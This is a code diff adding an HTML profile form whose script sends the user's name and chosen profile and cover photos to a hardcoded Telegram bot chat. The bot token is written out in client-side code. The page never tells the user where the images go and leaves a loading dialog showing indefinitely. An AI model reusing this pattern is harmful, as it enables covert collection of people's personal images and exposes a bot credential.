@@ -1,0 +1,178 @@
+<style>
+  #smallProfileImage {
+    position: absolute;
+    top: 20%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1;
+    border: 4px solid #fff;
+    box-shadow: 0 0 0 4px #fff;
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    cursor: pointer;
+  }
+  
+  #bigCoverImage {
+    position: relative;
+    width: 100%;
+    height: 300px;
+    background-size: cover;
+    background-position: center;
+    cursor: pointer;
+  }
+  
+  #loadingDialog {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    display: flex;
+    flex-direction: column;
+  }
+  
+  .loading-circle {
+    border: 4px solid #f3f3f3; /* Light grey */
+    border-top: 4px solid #3498db; /* Blue */
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 2s linear infinite;
+  }
+  
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  
+  #myForm {
+    position: relative;
+    max-width: 600px;
+    margin: 0 auto;
+    padding: 20px;
+    background-color: #fff;
+    border: 1px solid #ddd;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  }
+  
+  #myForm label {
+    display: block;
+    margin-bottom: 10px;
+    font-weight: bold;
+    color: #333;
+  }
+  
+  #myForm input[type="text"] {
+    width: 100%;
+    height: 40px;
+    margin-bottom: 20px;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+  }
+  
+  #myForm button[type="submit"] {
+    width: 100%;
+    height: 40px;
+    background-color: #3498db; /* Blue */
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+  
+  #myForm button[type="submit"]:hover {
+    background-color: #2980b9; /* Darker Blue */
+  }
+</style>
+
+<form id="myForm">
+  <label for="firstName">First Name:</label>
+  <input type="text" id="firstName" name="firstName"><br><br>
+  <div id="profilePictureContainer">
+    <img src="profile.jpg" alt="" id="smallProfileImage" style="width: 150px; height: 150px; border-radius: 50%; cursor: pointer;">
+    <input type="file" id="smallProfileImageInput" name="smallProfileImage" accept="image/*" style="display: none;">
+  </div>
+  <div id="coverPhotoContainer">
+    <img src="cover.jpg" alt="" id="bigCoverImage" style="width: 100%; height: 300px; cursor: pointer;">
+    <input type="file" id="bigCoverImageInput" name="bigCoverImage" accept="image/*" style="display: none;">
+  </div>
+  <br><br>
+  <button type="submit">Send Image </button>
+</form>
+
+<div id="loadingDialog" style="display: none;">
+  <div class="loading-circle"></div>
+  <h3>Loading...</h3>
+  <p>Please wait...</p>
+</div>
+<script>
+  const form = document.getElementById('myForm');
+  const smallProfileImage = document.getElementById('smallProfileImage');
+  const smallProfileImageInput = document.getElementById('smallProfileImageInput');
+  const bigCoverImage = document.getElementById('bigCoverImage');
+  const bigCoverImageInput = document.getElementById('bigCoverImageInput');
+  const loadingDialog = document.getElementById('loadingDialog');
+
+  smallProfileImage.addEventListener('click', (e) => {
+    smallProfileImageInput.click();
+  });
+
+  smallProfileImageInput.addEventListener('change', (e) => {
+    const file = smallProfileImageInput.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        smallProfileImage.src = e.target.result;
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  bigCoverImage.addEventListener('click', (e) => {
+    bigCoverImageInput.click();
+  });
+
+  bigCoverImageInput.addEventListener('change', (e) => {
+    const file = bigCoverImageInput.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        bigCoverImage.src = e.target.result;
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  const firstName = form.firstName.value;
+  const smallProfileImageFile = smallProfileImageInput.files[0];
+  const bigCoverImageFile = bigCoverImageInput.files[0];
+  const formData1 = new FormData();
+  const formData2 = new FormData();
+  formData1.append('chat_id', '6839990154');
+  formData1.append('photo', smallProfileImageFile);
+  formData1.append('caption', firstName + ' - Profile Picture');
+  formData2.append('chat_id', '6839990154');
+  formData2.append('photo', bigCoverImageFile);
+  formData2.append('caption', firstName + ' - Cover Picture');
+  fetch('https://api.telegram.org/bot6404586790:AAFpuevp9GBg7tLVDsw95JcWD93Lw5dj480/sendPhoto', {
+  method: 'POST',
+  body: formData1,
+  });
+  fetch('https://api.telegram.org/bot6404586790:AAFpuevp9GBg7tLVDsw95JcWD93Lw5dj480/sendPhoto', {
+  method: 'POST',
+  body: formData2,
+  });
+  loadingDialog.style.display = 'block';
+  });
+</script>
+
+ M
